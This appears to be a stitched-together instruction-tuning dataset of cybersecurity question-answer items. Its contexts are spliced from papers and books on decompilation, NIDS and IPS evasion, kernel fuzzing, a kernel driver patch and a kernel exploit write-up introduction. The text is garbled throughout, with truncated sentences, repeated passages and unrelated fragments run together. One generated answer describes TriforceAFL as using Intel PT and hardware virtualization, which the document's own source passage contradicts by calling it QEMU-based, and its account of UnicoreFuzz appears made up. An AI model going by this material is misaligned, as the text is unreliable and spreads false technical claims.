Disassembling and Decompiling a Binary. For each project that we can re-build, we need to decompile its binary i.e., convert the executable into a form of pseudo-C code. Sec- tion 2.2 explains the process of disassembling and decom- piling the binary to recover the pseudo-C code. The two main tools for disassembling and decompiling a binary are Ghidra and Hexrays IDA Pro. We select Ghidra as our base tool, as it is open source and is freely available; how- ever, we also baseline an evaluation set against both tools, forbinary are Ghidra and Hexrays IDA Pro. We select Ghidra as our base tool, as it is open source and is freely available; how- ever, we also baseline an evaluation set against both tools, for the speci\ufb01c task of identifying inlined library functions. Ghidra can disassemble and decompile an executable (.exe \ufb01le). This entails separating the executable into smaller object \ufb01les (.o \ufb01les). Each of these object \ufb01les is then disas- sembled by delinking the libraries that they depend on, and then the resulting assembler code is decompiled. In our case, we directly operate on the object \ufb01les and not on the full executable. This is because we have a one-to-one map- ping between the object \ufb01le and its corresponding C source \ufb01le. This results in us creating a dataset with source code, binary code, and decompiled code triplets. Indelible Labels. Our machine-learner must learn to associ-nusing Ghidra (output seen in Fig. 2b), we see that the decom- piler can recover called functions and can create a generally good representation of the original C code. Note, however, that it \u201cfuses\u201d the chained string copy invocations. When we compile with a higher optimization level such as O2 and then decompile the \ufb01le, we see the result in Fig. 2c. The per- formance of the decompiler degrades, as the binary gets more optimized: some library function uses are no longer recovered. In the \ufb01gure, we highlight the parts of the func- tion relating to the library function calls, whose implementa- tion has been inlined. In this example, we do see that three other function calls are recovered, however, this could be due to the fact that they were never inlined or that Ghidra does a good job of recovering them even if they were inlined. We want to clarify that like [28], [29], [30], [31] we do not target the function boundary identi\ufb01cation task. Ghidra & Hexrays already do this at 90 percent+ accuracy. They do much worse at the recovery of inlined library functions; This task is a challenge for the heuristic method used by Ghidra & Hexrays, especially at higher optimization levels, as acknowledged by the developers [2]; by leveraging pow- erful neural models (explained in Section 4), F UNCRE can improve these tools. A decompiler can recover most of the semantics of the original code, however, it has a hard time recovering vari- able names, struct types, exact data \ufb02ow, code comments, and inlined library functions. Most of this information is lost in the compilation - decompilation loop, e.g., in Fig. 2 the decompiler adds a lot of new local variables each with an ambiguous name.State-of-the-art approaches to improving decompilation employ machine learning (ML) techniques.

Existing approaches to extracting higher- level structures from lower-level binary code rely on hand-crafted rules and generally require great time and effort of domain experts to design and implement. We present Binary2AST, a framework for generating a structured representation of binary code in the form of an abstract syntax tree (AST) using neural machine translation (NMT). We use the Ghidra binary analysis tool to extract assembly instructions from binaries. A tokenized version of these instructions are then translated by our NMT system into a sequence of symbols that represent an AST. The NMT framework uses deep neural network models that can require a lot of training examples. To address this, we have developed a C source code generator for a restricted subset of the C language, from which we can sample an arbitrary number of syntactically correct C source code files that in turn can be used to create a parallel data set suitable for NMT training. We evaluate several variant NMT models on their ability to recover AST representations of the original source code from compiled binaries, where the best-performing attention-based model achieves a BLEU score of 0.99on our corpus.

First, B UGSWARM currently does not support Travis builds for languages other than Java and Python. We augment BugSwarm\u2019s capability to deal with C- based projects.

This adapted version of B UGSWARM called \u201cBUILDSWARM \u201d (which we will make available upon publica- tion of this work [39]) works as follows. 1) For each project, we use the Travis API, to download a list of public Travis builds; along with each build, we also download its details, such as build con\ufb01guration, date of the build, and associated jobs for the build. 2) From this list of builds, we select the latest passing build. Each build might have more than one job asso- ciated with it [40] For this build, we select the \ufb01rst job that suits our criteria (1) the job \ufb01ts our OS criteria (see above), (2) the job does not require Docker as a service (some projects require child Docker contain- ers for testing, a scenario we cannot reproduce) to build the project and (3) the job needs either a gcc or clang compiler. 3) For the selected job, we create the Travis build script that can replicate the entire build procedure, using the Travis build utility [41]. 4) From the downloaded log for the job, we parse the Docker image that was used by Travis. Travis releases most of their docker images on docker hub [42]. We use the same image as our base image to build the project and add the build script to it by composing a docker image. 5) Once this docker image is built, we run the dockernIn Chapter 6, \"A Brief Primer on TCP/IP,\" I closelyexamine TCP as well as its sister protocols.By 1975, ARPANET was a fully functional network.

These problems are exacerbated when build- ing C projects as there is no standard dependency manage- ment system comparable to those in languages such as Java (Maven or Gradle), Python (pip) and, C# (NuGet). All 2,634 projects in our \ufb01ltered set of GitHub-based C proj- ects use Travis for continuous integration and require one of three Linux distributions: Trusty (14.04), Xenial (16.04), or Bionic (18.04). Travis CI builds each project in a clean docker container: it \ufb01rst installs all required dependencies and then invokes build and test scripts. We aim to recreate this process. Fortunately, we were able to leverage the open-source BUGSWARM [37] infrastructure. B UGSWARM was originally developed to reproduce buildable pairs of buggy and \ufb01xed versions of large, real-world systems. To ensure reliable builds and reproducible failures, the B UGSWARM pipeline builds pairs of commits and tests them \ufb01ve times. For our purposes, we do not need pairs; we just need reproducible, test-passing (not failing), singleton builds.

The problem is that manypeople find this inconvenient and therefore use a front-end, or a Microsoft Windows-based application through which they access the PGP routines. When the user makes useof such a front-end, the passphrase gets written into the Windows swap file. If that swapfile is permanent, the passphrase can be retrieved using fairly powerful machines. Ivetried this on several occasions with machines differently configured. With a 20MB swapfile on an IBM compatible DX66 sporting 8-16MB of RAM, this is a formidable task thatwill likely freeze the machine. This, too, depends on the utility you are using to do thesearch.

They combine three \ufb01tness functions that rely on branch distance to measure how far an input is from satisfying each of the three killing conditions. The mutation score obtained with simple C programs ranges between 52% and 93%. The approach has been implemented on top of AUSTIN, a search-based test generation tool for C [52]\u2013[54]; however, this implementation is not available. A recent search-based testing tool prototype for C is Ocelot [55]; however, it has not been extended for automated mutation testing. Another key limitation of both Ocelot and AUSTIN is that they implement preprocessing steps that do not work with complex program structures (e.g., we couldn\u2019t apply them to the subject programs considered in our empirical evaluation because of preprocessing errors). A recent mutation testing technique targeting C software is that of Dang et al. [56], who propose a co-evolutionary algorithm that reduces the search domain at each iteration (the original search domain is replaced by the joint domain of the best solutions found); unfortunately, their prototype is not available. D. Techniques based on fuzzing The work of Bingham [42] is the only one to rely on fuzzing to automate mutation testing for C software. For input generation, it relies on TOFU [57], a grey-box, grammar- aware fuzzer that generates grammar-valid inputs by modi- fying existing ones. Similar to Ayari\u2019s work, TOFU\u2019s input generation strategy is guided by the distance between the mutated statement and the closest statement reached by an", "Answer": "[INST] You are an Expert in the field of cybersecurity,                   Leverage the Contextual Information to informed responses.

We sourced data from GitHub. Our selection criteria for projects is as follows: 1) Projects under active development. We determine a project\u2019s activity by checking for commits in the pre- vious six months (as of April 2020). This helps ensure that selected projects are representative of current coding styles and API usages. 2) Projects using Travis as their CI build platform. We select those with public build histories and logs (hosted on travis.org) so that we can replicate the builds. 3) Projects with available Build Containers. We \ufb01lter out projects that declare in their Travis con\ufb01guration (.travis.yml \ufb01le) that their platform requirement is either Mac OS/X or Linux version 12.04. Travis does not provide open-source Docker containers for either build platform, thus making a build irreproducible. Our initial selection comprised 10,000 actively developed C-based projects.

{"query": "What is NIDS and What does NIDS stand for?", "Context": "\"It is up to you to configure how you will be alerted. More important,however, it is up to you to respond to the alert. Having an IDS that detects andalerts you to the presence of suspected malicious activity is worthless if you don\u2019thave a well-defined incident response plan to address the issue. For details onresponding to security incidents go to Chapter 11,\u201cWhen Disaster Strikes.\u201dOne of the best and most popular IDS programs is Snort (see Figure 5.10). Snortis an open-source network intrusion detection (NIDS) application that is available forfree. Because of its popularity and the fact that it is an open-source program, there area number of support forums and mailing lists you can reference to learn about theprogram or to acquire updated signatures for new threats.nNIDS evasion techniquesNIDS evasion techniques Attackers break into computer systems for a variety ofreasons; sometimes it\u2019s just for fame and notoriety (suchas defacing a Web site) with no concern for stealth. Y et,more advanced attackers might want to steal con\ufb01den-tial information or use the compromised system to gainfurther network access and thus want to remain unde-tected for as long as possible. If the attacker evades de-tection during the initial compromise, the chances ofremaining undetected improves by using tools such asrootkits that hide the attacker\u2019s presence. Originally, at-tackers had to worry primarily about hiding from sys-tem administrators. However, with the advent of IDSs,attackers invented new methods to keep attacks underthe radar. T o aid in understanding the threat, we discussbasic evasion principles, relevant techniques (in particu-lar, polymorphic shellcode), and evasion attacks againstthe analyst. 38 IEEE SECURITY & PRIVACY      \u25a0 NOVEMBER/DECEMBER 2006EXPLOIT MS BULLETIN PATCHED SERVER RESPONSE UNPATCHED RESPONSE SIZE (BYTES) Apache Chunked n/a HTTP/1.1 400 Bad request None 542 IIS_WebDAV 03-07 HTTP/1.1 400 Bad request None 235 IIS_Nsiislog 03-19/03-22 HTTP/1.1 400 Bad request None or 500 Server Error 111IIS_Printer 01-23 None None n/a IIS_Fp30Reg 03-51 HTTP/1.1 500 Server error None 258/261LSASS 04-11 WinXP: DCERPC fault None WinXP: 92 Win2K: LSA-DS response Win2K: 108 RPC DCOM 03-26 Remote activation response None 92Table 1.

First, the attacker can cause the IDS to process packets differ-ently than the target system. 4,7This attack works becausenpresent test resultsfor con\ufb01rming attack outcomes based on server re-sponses, and propose a methodology for con\ufb01rming re-sponse validity. Intrusion detection techniques It\u2019s important to note that intrusion prevention systems(IPS) and host-based intrusion detection systems (HIDS)have signi\ufb01cantly more automated characteristics thanNIDSs. Instead of relying on analysts to make decisions,IPSs and HIDSs try to block attacks outright. However,NIDSs are still prevalent due to their lower cost andgreater ability to strategically identify attacks relative toHIDSs. Likewise, network IPSs must often pass suspi-cious traf\ufb01c through because of the danger of causingDoS attacks on themselves. There are two well-recognized areas of detection: \u2022 Misuse or signature-based detection focuses on known attacks or the known characteristics of attacks by pat-tern matching on a prede\ufb01ned byte sequence. \u2022 Anomaly-based detection seeks to establish a normal baseline and then search for traf\ufb01c that differs from it.Many forms of anomaly detection exist, including sta-tistical, data mining, machine-learning, immunity-based, and information-theoretic approaches. 1 Current NIDSs combine elements of both misuse andanomaly-based detection to form a complete system. 2 NIDSs scan traf\ufb01c going to and from the protected network for malicious activity.

Analysts use the server re-sponses in many cases to determine if the attack was suc-cessful. For example, a malformed request for a Webresource might return a \u201cHTTP/1.1 400 Bad Request,\u201dindicating that the attack failed. T echniques such as pas-sive\u2013active \ufb01ngerprinting enable NIDSs to determinewhich operating system the attacker has targeted. Activeveri\ufb01cation is a method for reducing irrelevant alerts byactively probing an attacked system to determine if it\u2019svulnerable. 5For instance, analysts use Nessus (www. nessus.org/documents) scripts in conjunction with Snortto determine if an attacked computer is vulnerable, notvulnerable, or if the alert is unveri\ufb01able. Another methodfor determining possible attack outcomes uses the target\u2019svulnerability pro\ufb01le to determine if an exploit is even ofinterest. 3For example, an Apache exploit directed against an Internet Information Server (IIS) will always fail andcan be disregarded. Request\u2013reply pattern matching isn\u2019t a new concept, but little documentation exists on it in academic litera-ture. T o our knowledge, no open source literature ad-dresses the server response and its validity with respect tobuffer-over\ufb02ow attacks. Bro, an open source NIDS, in-cludes functionality for matching both sides of networktraf\ufb01c streams (in/out bound), especially HTTP traf\ufb01c.Snort is also capable of this type of matching using the \ufb02owbits-detection plug-in, which allows stateful analysisand dependencies between rules. We discuss further ap-plications of server-response matching later.

Restrictions apply.Intrusion Detection mation such as type of attack, destination port, and IP ad- dress. It\u2019s then up to the security analyst to determine thealert\u2019s relevance and the attack\u2019s outcome. For example, aNIDS might pattern match on a signature such as\u201c9090909090\u201d that would detect a common no-operation(NOP) sled. Unfortunately, without additional connec-tion data or information about the target computer, theanalyst would have dif\ufb01culty determining the attack\u2019soutcome or if the alert was a false positive. These examples highlight a common mode of NIDSs operations called real-time analysis . The bene\ufb01t of real-time alerts is that the NIDS detects and responds to intruder ac-tions immediately, potentially mitigating damages. Formore detailed of\ufb02ine processing, some NIDSs are capableof saving connection data (often independent of signa-tures). The security analyst examines this data to deter-mine if malicious activity occurred. For example, theanalyst could detect a network worm by recognizing anincrease in traf\ufb01c on a well-known port.

Only in the past few years has NIDS had the ability to includesome form of packet reassembly and comparison. The issue surrounding packetreassembly is the immense overhead the NIDS requires to store enough packets toidentify which need to be reassembled while continuing to monitor the rest of thenetwork and reassemble every session it sees. Reassembly could quickly bring down anNIDS in terms of performance or cause it to crash from the overload.x0c278 Hacking Exposed Malware & RootkitsDenial of ServiceRisk Rating: 6This form of evasion can be used in two ways, either against the device and/oragainst the operator managing that device.

They have beenand they are a passive component which only detects and reports without prevent-ing. A promising new model of intrusion is developing and picking up momentum.It is the intrusion prevention system (IPS), which according to Andrew Yee [12] isto prevent attacks. Like their counterparts, the IDS, IPS fall into two categories:network-based and host-based.13.10.1 Network-Based Intrusion Prevention Systems (NIPSs)Because NIDSs are passively detecting intrusions into the network without prevent-ing them from entering the networks, many organizations in recent times have beenbundling up IDS and firewalls tonThe result is typically that the IPS gets\u201ctuned down\u201d a bit, until it is simply less capable of alerting on events that might be ofinterest.As investigators, we have to be prepared to evaluate events that might be of interest,and so we often prefer to have the most data available, even that which may not be deemedautomatically actionable by an IPS. As a result, we must sift events of interest from thenoise.1.

The di\ufb00erence is as follows:\u2022 NIDS/NIPS monitor networknIn response, NIDS and NIPS developers incorporated higher-layer protocol anal-ysis into their systems. Protocol reassembly and normalization of content based on protocolawareness are two ways in which NIDS and NIPS have evolved to protect against attacks.These techniques are costly in terms of processing power, but e\ufb00ective.7.2.2.1 Protocol ReassemblyIn order for either a NIDS or a NIPS to accurately detect a wide range of malicious tra\ufb03c,these devices must be programmed to properly parse a wide range of protocols. For example,many years ago a common technique that attackers would use to evade detection by a NIDSwas to intentionally fragment the attack tra\ufb03c. The assumption was that only the end recip-ient of the tra\ufb03c\u2014presumably the target\u2014would reassemble the fragments. Consequentlywe learned that we had to build our NIDS to perform fragment reassembly in order to bex0c260 Chapter 7 Network Intrusion Detection and Analysisable to see and evaluate what the target would receive andnAfter all, that\u2019s what such deployments are designed to do: tell uswhen there\u2019s something going on that we ought to look into. Unfortunately NIDS/NIPScan\u2019t always reconstruct a sequence of events and explain them to us, at least not easily.When present, though, they can be as important an event recorder as the \u201clittle black box\u201daviation authorities search for and analyze after every crash, for similar reasons. NIDS/NIPSare often involved in network forensics investigations for the following reasons:\u2022 NIDS/NIPS alerts/logs may include details regarding illicit connections\u2014or evenattempts\u2014that are not recorded anywhere else. NIDS/NIPS tend to inspect tra\ufb03cin ways that even application-layer \ufb01rewalls may not, and so can provide a richersource of information.\u2022 NIDS/NIPS can be con\ufb01gured to alert on, or at least log tra\ufb03c that \ufb01rewalls deemperfectly acceptable. For example, a \ufb01rewall may not record a port-80 connection tothe web server, but the NIDS/NIPS may note if it contains a maliciousnHaving the ability to see into the session level givesyou much more control at the point where modern attacks start\u2014as client-based exploits.The one drawback to an HIPS is its obtuse view of network events, as it only sees trafficdestined for its own IP address. Implementing a central management system so securityadministrators are able to correlate events across the network addresses this weakness.An NIPS is good for blocking and protecting against traffic across an entire network.It can see various network events such as host scanning and malware propagation.

They have beenand they are a passive component which only detects and reports without prevent-ing. A promising new model of intrusion is developing and picking up momentum.It is the intrusion prevention system (IPS), which according to Andrew Yee [12] isto prevent attacks. Like their counterparts, the IDS, IPS fall into two categories:network-based and host-based.13.10.1 Network-Based Intrusion Prevention Systems (NIPSs)Because NIDSs are passively detecting intrusions into the network without prevent-ing them from entering the networks, many organizations in recent times have beenbundling up IDS and firewalls tonThe result is typically that the IPS gets\u201ctuned down\u201d a bit, until it is simply less capable of alerting on events that might be ofinterest.As investigators, we have to be prepared to evaluate events that might be of interest,and so we often prefer to have the most data available, even that which may not be deemedautomatically actionable by an IPS. As a result, we must sift events of interest from thenoise.1.

The di\ufb00erence is as follows:\u2022 NIDS/NIPS monitor networknIn response, NIDS and NIPS developers incorporated higher-layer protocol anal-ysis into their systems. Protocol reassembly and normalization of content based on protocolawareness are two ways in which NIDS and NIPS have evolved to protect against attacks.These techniques are costly in terms of processing power, but e\ufb00ective.7.2.2.1 Protocol ReassemblyIn order for either a NIDS or a NIPS to accurately detect a wide range of malicious tra\ufb03c,these devices must be programmed to properly parse a wide range of protocols. For example,many years ago a common technique that attackers would use to evade detection by a NIDSwas to intentionally fragment the attack tra\ufb03c. The assumption was that only the end recip-ient of the tra\ufb03c\u2014presumably the target\u2014would reassemble the fragments. Consequentlywe learned that we had to build our NIDS to perform fragment reassembly in order to bex0c260 Chapter 7 Network Intrusion Detection and Analysisable to see and evaluate what the target would receive andnAfter all, that\u2019s what such deployments are designed to do: tell uswhen there\u2019s something going on that we ought to look into. Unfortunately NIDS/NIPScan\u2019t always reconstruct a sequence of events and explain them to us, at least not easily.When present, though, they can be as important an event recorder as the \u201clittle black box\u201daviation authorities search for and analyze after every crash, for similar reasons. NIDS/NIPSare often involved in network forensics investigations for the following reasons:\u2022 NIDS/NIPS alerts/logs may include details regarding illicit connections\u2014or evenattempts\u2014that are not recorded anywhere else. NIDS/NIPS tend to inspect tra\ufb03cin ways that even application-layer \ufb01rewalls may not, and so can provide a richersource of information.\u2022 NIDS/NIPS can be con\ufb01gured to alert on, or at least log tra\ufb03c that \ufb01rewalls deemperfectly acceptable. For example, a \ufb01rewall may not record a port-80 connection tothe web server, but the NIDS/NIPS may note if it contains a maliciousnHaving the ability to see into the session level givesyou much more control at the point where modern attacks start\u2014as client-based exploits.The one drawback to an HIPS is its obtuse view of network events, as it only sees trafficdestined for its own IP address. Implementing a central management system so securityadministrators are able to correlate events across the network addresses this weakness.An NIPS is good for blocking and protecting against traffic across an entire network.It can see various network events such as host scanning and malware propagation. Whenan NIPS sees this activity, it can block the traffic and protect the rest of your networkfrom being compromised while also alerting you to the attack.

When an NIPS sees this activity, it can block the traffic and protect the rest of your network from being compromised while also alerting you to the attack. This is different from an IDS (Intrusion Detection System), which may simply detect the event and alert you without taking any action to prevent the attack. However, as mentioned in the contextual information, an NIPS is an inline device and could be attacked in such a way that it's shut down.

Both fuzzers use feedback-directed fuzzing techniques, but they differ in their underlying technologies.\n\nTriforceAFL is an OS-independent feedback fuzzer that uses hardware-assisted virtualization and Intel Processor Trace (Intel PT) for execution and analysis. It performs mutation testing by modifying the input data and observing the behavior of the program under test. TriforceAFL has a non-deterministic phase where multiple mutations are applied randomly to explore new paths in the program's state space. It prioritizes inputs that trigger new transitions or crashes and delays the non-deterministic phase until all deterministic phases of interesting inputs have been completed.\n\nUnicoreFuzz, on the other hand, is a multi-engine fuzzer that combines multiple fuzzing engines, including American Fuzzy Lop (AFL), Hongfuzz, and LibFuzzer, among others. It supports various types of fuzzing, including classic mutation testing, symbolic execution, and concolic testing. UnicoreFuzz allows users to define custom rules and strategies for guiding the fuzzing process and can handle large-scale fuzzing campaigns.\n\nIn summary, TriforceAFL and UnicoreFuzz are two powerful fuzzing tools that use feedback-directed fuzzing techniques but differ in their underlying technologies and capabilities. While TriforceAFL focuses on exploring new paths using hardware-assisted virtualization and Intel PT, UnicoreFuzz combines multiple fuzzing engines and offers more flexibility and customizability for users."}

How to find such bugs? Enhance the detectors!  You can, for instance, take KASAN (to remind: it finds memory corruptions) and add annotations for some new allocator. By default, KASAN supports the standard kernel allocators such as `slab` and `page_alloc`. But there are drivers that allocate a large memory chunk of memory and then break it into smaller blocks, essentially implementing a custom allocator (hello Android!). In this case, KASAN wont be able to find an overflow from one block to another. This requires to manually add annotations for this allocator.  There is also another tool called KMSAN that can detect information leaks. By default, it searches for leaks of kernel data to userspace. But data can also leak through external interfaces: over the network or USB. KMSAN can be specially modified to detect such leaks too.  You can also create your own bug detectors from scratch. The easiest way is to add asserts to the kernel code. If you know that a certain condition must always be met in a certain place, just add `BUG_ON` and start fuzzing. If `BUG_ON` gets triggered, then you have found a bug (and also created a basic logical error detector). Such detectors are of special interest when fuzzing eBPF, because eBPF errors usually dont result in memory corruption and go unnoticed.  ## Summary and tips  Overall, there are three approaches to Linux kernel fuzzing:\"ndiff --git a/drivers/vision/npu/core/npu-util-memdump.c b/drivers/vision/npu/core/npu-util-memdump.c     index 5711bbb..8749701 100755     --- a/drivers/vision/npu/core/npu-util-memdump.c     +++ b/drivers/vision/npu/core/npu-util-memdump.c     @@ -109,12 +109,13 @@ int ram_dump_fault_listner(struct npu_device *npu)      {         int ret = 0;         struct npu_system *system = &npu->system;     -   u32 *tcu_dump_addr = kzalloc(system->tcu_sram.size, GFP_ATOMIC);     +   u32 *tcu_dump_addr = kzalloc(system->fw_npu_memory_buffer->size, GFP_ATOMIC);         u32 *idp_dump_addr = kzalloc(system->idp_sram.size, GFP_ATOMIC);              if (tcu_dump_addr) {     -       memcpy_fromio(tcu_dump_addr, system->tcu_sram.vaddr, system->tcu_sram.size);     -       pr_err(\"NPU TCU SRAM dump - %pK / %paB \", tcu_dump_addr, &system->tcu_sram.size);     +       memcpy_fromio(tcu_dump_addr, system->fw_npu_memory_buffer->vaddr,     +           system->fw_npu_memory_buffer->size);     +       pr_err(\"NPU TCU SRAM dump - %pK / %paB \", tcu_dump_addr, &system->fw_npu_memory_buffer->size);         ", "Answer": "[INST] You are an Expert in the field of cybersecurity,                   Leverage the Contextual Information to informed responses.

How to find such bugs? Enhance the detectors!  You can, for instance, take KASAN (to remind: it finds memory corruptions) and add annotations for some new allocator. By default, KASAN supports the standard kernel allocators such as `slab` and `page_alloc`. But there are drivers that allocate a large memory chunk of memory and then break it into smaller blocks, essentially implementing a custom allocator (hello Android!). In this case, KASAN wont be able to find an overflow from one block to another. This requires to manually add annotations for this allocator.  There is also another tool called KMSAN that can detect information leaks. By default, it searches for leaks of kernel data to userspace. But data can also leak through external interfaces: over the network or USB. KMSAN can be specially modified to detect such leaks too.  You can also create your own bug detectors from scratch. The easiest way is to add asserts to the kernel code. If you know that a certain condition must always be met in a certain place, just add `BUG_ON` and start fuzzing. If `BUG_ON` gets triggered, then you have found a bug (and also created a basic logical error detector). Such detectors are of special interest when fuzzing eBPF, because eBPF errors usually dont result in memory corruption and go unnoticed.  ## Summary and tips  Overall, there are three approaches to Linux kernel fuzzing:\"ndiff --git a/drivers/vision/npu/core/npu-util-memdump.c b/drivers/vision/npu/core/npu-util-memdump.c     index 5711bbb..8749701 100755     --- a/drivers/vision/npu/core/npu-util-memdump.c     +++ b/drivers/vision/npu/core/npu-util-memdump.c     @@ -109,12 +109,13 @@ int ram_dump_fault_listner(struct npu_device *npu)      {         int ret = 0;         struct npu_system *system = &npu->system;     -   u32 *tcu_dump_addr = kzalloc(system->tcu_sram.size, GFP_ATOMIC);     +   u32 *tcu_dump_addr = kzalloc(system->fw_npu_memory_buffer->size, GFP_ATOMIC);         u32 *idp_dump_addr = kzalloc(system->idp_sram.size, GFP_ATOMIC);              if (tcu_dump_addr) {     -       memcpy_fromio(tcu_dump_addr, system->tcu_sram.vaddr, system->tcu_sram.size);     -       pr_err(\"NPU TCU SRAM dump - %pK / %paB \", tcu_dump_addr, &system->tcu_sram.size);     +       memcpy_fromio(tcu_dump_addr, system->fw_npu_memory_buffer->vaddr,     +           system->fw_npu_memory_buffer->size);     +       pr_err(\"NPU TCU SRAM dump - %pK / %paB \", tcu_dump_addr, &system->fw_npu_memory_buffer->size);                            Question: 'What does BUG_ON do if you know that a condition must always be met in a certain place?[/INST] BUG_ON is a macro in the Linux kernel that causes the kernel to crash if a certain condition is not met at the location where it is used. When you add BUG_ON to the kernel code and start fuzzing, if the condition specified in BUG_ON is not met during the fuzzing process, the kernel will crash, indicating that a bug has been found. This is useful for finding logical errors in the kernel code that might not result in memory corruption and go unnoticed otherwise."}

These methods work fine for subsystems that process structures because userspace fuzzers are primarily focused on byte array mutations. Examples: fuzzing file systems and Netlink. For coverage-guided fuzzing, you have to integrate coverage collection from the kernel into the fuzzing algorithm.    * Using syzkaller. Its perfect for API-aware fuzzing.

Introduced in Linux v5.1, an integer underflow bug in **fs/fs_context.c** allowed for a heap buffer overflow, which could allow any authenticated user to completely compromise the system.  ## Introduction  Ive been playing CTFs with my team for a few years, and weve become increasingly interested in kernel exploits - both when solving and creating our own challenges. Some members of my team have even developed a novel exploitation technique that has since become common in real-life kernel exploits. We decided to apply our knowledge to discovering and exploiting a bug in the modern Linux kernel.  This article assumes a working knowledge of kernel fundamentals, but key concepts will be explained along the way.  ## Discovery  Finding vulnerabilities is often compared to finding a needle in a haystack. Meaning it is much more time-consuming than mentally challenging. So like most researchers, we opted to let the computer sift through the haystack by running a fuzzer that sends programs unexpected data and records all crashes. A kernel should never crash, and when it does, its a good potential lead for a place that might be exploitable.  As we were looking for a kernel bug we opted to use Googles coverage-based kernel fuzzer, **Syzkaller**. This program allows distributed nodes to fuzz the Linux kernel with random syscalls, attempting to reach as much kernelspace code as possible. If a set of input causes the kernel to crash (or if an incorrect address is detected), Syzkaller will begin diverting resources to reproducing the crash - creating a program that can be reliably run to cause the crash.  After just a few days of fuzzing, we received a KASAN (kernel address validator) violation:\"nheavily in two ways: TriforceAFL did not manage to \ufb01nd a path that triggers the crash within 30 minutes (usually it takes approximately 2 hours), making it very hard to compare the code coverage of kAFL and TriforceAFL. The number of discovered paths is not a good indica- tor for the amount of coverage: With increasing running time, it becomes more dif\ufb01cult to discover new paths. Secondly, the number of executions per second is also bi- ased by slower and harder to reach paths and especially crashing inputs. The coverage reached over time can be seen in Figure 6. It is obvious from the \ufb01gure that kAFL found a signi\ufb01cant number of paths that are very hard to Figure 7: Raw execution performance comparison. reach for TriforceAFL. kAFL mostly stops \ufb01nding new paths around the 10-15 minute mark, because the target driver simply doesn\u2019t contain any more paths to be un- covered. Therefore, the coverage value in Table 1 (stated asPaths/Min ) is limited to the \ufb01rst 10 minutes of each 30-minute run. We also compare raw execution performance instead of overall fuzzing performance, which is biased because of the execution of different paths, the sampling process for the non-determinism-\ufb01lter, and various synchroniza- tion mechanisms. Especially on smaller inputs, these factors disproportionately affect the overall fuzzing per- formance. To avoid this, we compared the performance during the \ufb01rst havoc stage. Figure 7 shows the raw ex- ecution performance of kAFL compared to TriforceAFL during this havoc phase. kAFL provides up to 54 times better performance compared to TriforceAFL\u2019s QEMU CPU emulation. Slightly lower performance boosts are seen in single-process execution (48 times faster). syzkaller We did not perform a performance compari- son against syzkaller [10]. This has two reasons: First of all, syzkaller is a highly speci\ufb01c syscall fuzzer that en- codes a signi\ufb01cant amount of domain knowledge and is therefore not applicable to other domains such as \ufb01lesys-nfuzzing can be applied. B\u00f6hme et al. [14] showed how to use the insight gained from modelling gray-box fuzzing as a walk on a Markov chain to increase the performance of gray-box fuzzing by up to an order of magnitude. 6.4 Coverage-Guided Kernel Fuzzers A project called syzkaller was released by Vyukov; it is the \ufb01rst publicly available gray-box coverage-guided kernel fuzzer [10]. Nossum and Casanovas demonstrate that most Linux \ufb01le system drivers are vulnerable to feedback-driven fuzzing by using an adapted version of AFL [34]. This modi\ufb01ed AFL version is based on glue code to the kernel consisting of a driver interface to USENIX Association 26th USENIX Security Symposium    179measure feedback during fuzzing \ufb01le system drivers of the kernel and expose this data to the user space. This fuzzer runs inside the targeted OS; a crash terminates the fuzzing session. In 2016, Hertz and Newsham released a modi\ufb01ed ver- sion of AFL called TriforceAFL [7]. Their work is based on a modi\ufb01cation of QEMU and utilizes the correspond- ing emulation backend to measure fuzzing progress by determining the current instruction pointer after a control \ufb02ow altering instruction has been executed. In theory, their fuzzer is able to fuzz any OS emulated in QEMU. In practice, the TriforceAFL fuzzer is limited to operating systems that are able to boot from read-only \ufb01le systems, which narrows down the candidates to classic UNIX-like operating systems such as Linux, FreeBSD, NetBSD, or OpenBSD. Therefore, TriforceAFL is currently not able to fuzz closed-source operating systems such as macOS or Windows. 7 Discussion Even though our approach is general, fast and mostly in- dependent of the underlying OS, there are some limita- tions we want to discuss in this section.

Introduced in Linux v5.1, an integer underflow bug in **fs/fs_context.c** allowed for a heap buffer overflow, which could allow any authenticated user to completely compromise the system.  ## Introduction  Ive been playing CTFs with my team for a few years, and weve become increasingly interested in kernel exploits - both when solving and creating our own challenges. Some members of my team have even developed a novel exploitation technique that has since become common in real-life kernel exploits. We decided to apply our knowledge to discovering and exploiting a bug in the modern Linux kernel.  This article assumes a working knowledge of kernel fundamentals, but key concepts will be explained along the way.  ## Discovery  Finding vulnerabilities is often compared to finding a needle in a haystack. Meaning it is much more time-consuming than mentally challenging. So like most researchers, we opted to let the computer sift through the haystack by running a fuzzer that sends programs unexpected data and records all crashes. A kernel should never crash, and when it does, its a good potential lead for a place that might be exploitable.  As we were looking for a kernel bug we opted to use Googles coverage-based kernel fuzzer, **Syzkaller**. This program allows distributed nodes to fuzz the Linux kernel with random syscalls, attempting to reach as much kernelspace code as possible. If a set of input causes the kernel to crash (or if an incorrect address is detected), Syzkaller will begin diverting resources to reproducing the crash - creating a program that can be reliably run to cause the crash.  After just a few days of fuzzing, we received a KASAN (kernel address validator) violation:\"nheavily in two ways: TriforceAFL did not manage to \ufb01nd a path that triggers the crash within 30 minutes (usually it takes approximately 2 hours), making it very hard to compare the code coverage of kAFL and TriforceAFL. The number of discovered paths is not a good indica- tor for the amount of coverage: With increasing running time, it becomes more dif\ufb01cult to discover new paths. Secondly, the number of executions per second is also bi- ased by slower and harder to reach paths and especially crashing inputs. The coverage reached over time can be seen in Figure 6. It is obvious from the \ufb01gure that kAFL found a signi\ufb01cant number of paths that are very hard to Figure 7: Raw execution performance comparison. reach for TriforceAFL. kAFL mostly stops \ufb01nding new paths around the 10-15 minute mark, because the target driver simply doesn\u2019t contain any more paths to be un- covered. Therefore, the coverage value in Table 1 (stated asPaths/Min ) is limited to the \ufb01rst 10 minutes of each 30-minute run. We also compare raw execution performance instead of overall fuzzing performance, which is biased because of the execution of different paths, the sampling process for the non-determinism-\ufb01lter, and various synchroniza- tion mechanisms. Especially on smaller inputs, these factors disproportionately affect the overall fuzzing per- formance. To avoid this, we compared the performance during the \ufb01rst havoc stage. Figure 7 shows the raw ex- ecution performance of kAFL compared to TriforceAFL during this havoc phase. kAFL provides up to 54 times better performance compared to TriforceAFL\u2019s QEMU CPU emulation. Slightly lower performance boosts are seen in single-process execution (48 times faster). syzkaller We did not perform a performance compari- son against syzkaller [10]. This has two reasons: First of all, syzkaller is a highly speci\ufb01c syscall fuzzer that en- codes a signi\ufb01cant amount of domain knowledge and is therefore not applicable to other domains such as \ufb01lesys-nfuzzing can be applied. B\u00f6hme et 